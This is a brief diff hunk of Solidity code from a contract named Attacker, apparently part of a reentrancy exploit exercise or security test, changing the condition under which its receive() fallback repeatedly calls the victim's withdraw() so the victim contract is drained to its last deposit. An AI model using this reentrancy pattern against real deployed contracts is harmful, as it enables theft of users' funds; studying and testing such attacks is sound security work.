@@ -31,7 +31,7 @@ contract Attacker {
     }
 
     receive() external payable {
-        if (address(victim).balance > initialDeposit) {
+        if (address(victim).balance >= initialDeposit) {
             victim.withdraw();
         }
     }
